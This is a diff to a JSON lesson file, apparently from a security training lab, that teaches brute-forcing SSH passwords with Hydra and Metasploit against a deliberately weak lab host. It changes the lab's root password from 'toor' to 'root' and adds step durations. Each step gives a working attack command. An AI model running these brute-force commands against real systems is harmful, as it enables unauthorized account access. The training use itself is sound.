@@ -6,24 +6,27 @@
   "ip": "172.20.0.17",
   "port": 22,
   "short_description": "Use Hydra and Metasploit to crack weak SSH passwords.",
-  "description": "Many systems still use weak or default passwords. This lesson teaches you to use Hydra (fast) and Metasploit (integrated) to brute force SSH credentials. The target has intentionally weak passwords: root/toor and user/password.",
+  "description": "Many systems still use weak or default passwords. This lesson teaches you to use Hydra (fast) and Metasploit (integrated) to brute force SSH credentials. The target has intentionally weak passwords: root/root and user/password.",
   "steps": [
     {
       "title": "Verify SSH is running",
       "command": "nmap -sV 172.20.0.17 -p 22",
       "explanation": "Confirm the SSH service is accessible.",
-      "expected": "22/tcp open ssh OpenSSH"
+      "expected": "22/tcp open ssh OpenSSH",
+      "duration": "5-10 sec"
     },
     {
       "title": "Try Hydra first (faster)",
       "command": "hydra -l root -P /root/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17 -t 4",
       "explanation": "Hydra tries each password in the wordlist. -t 4 means 4 parallel threads. This is faster than Metasploit for brute forcing.",
-      "expected": "[22][ssh] host: 172.20.0.17 login: root password: toor"
+      "expected": "[22][ssh] host: 172.20.0.17   login: root   password: root",
+      "duration": "30-90 sec"
     },
     {
       "title": "Alternative: Use Metasploit",
       "command": "msfconsole -q",
-      "explanation": "Metasploit's scanner is slower but integrates with the database."
+      "explanation": "Metasploit's scanner is slower but integrates with the database.",
+      "duration": "5-15 sec"
     },
     {
       "title": "Load the SSH login scanner",
@@ -49,16 +52,17 @@
       "title": "Run the brute force",
       "command": "run",
       "explanation": "This will try each password until it finds one that works.",
-      "expected": "[+] 172.20.0.17:22 - Success: 'root:toor'"
+      "expected": "[+] 172.20.0.17:22 - Success: 'root:root'",
+      "duration": "1-3 min"
     },
     {
       "title": "Connect with found credentials",
       "command": "ssh root@172.20.0.17",
-      "explanation": "Use the discovered password (toor) to log in.",
-      "expected": "Password prompt - enter 'toor'"
+      "explanation": "Use the discovered password (root) to log in.",
+      "expected": "Password prompt - enter 'root'"
     }
   ],
-  "success_criteria": "Hydra or Metasploit finds the password 'toor' for root, and you can SSH in with those credentials.",
+  "success_criteria": "Hydra or Metasploit finds the password 'root' for root, and you can SSH in with those credentials.",
   "next_steps": [
     "Try cracking the 'user' account (password is 'password')",
     "Use 'sessions' in Metasploit to see if it created a session",
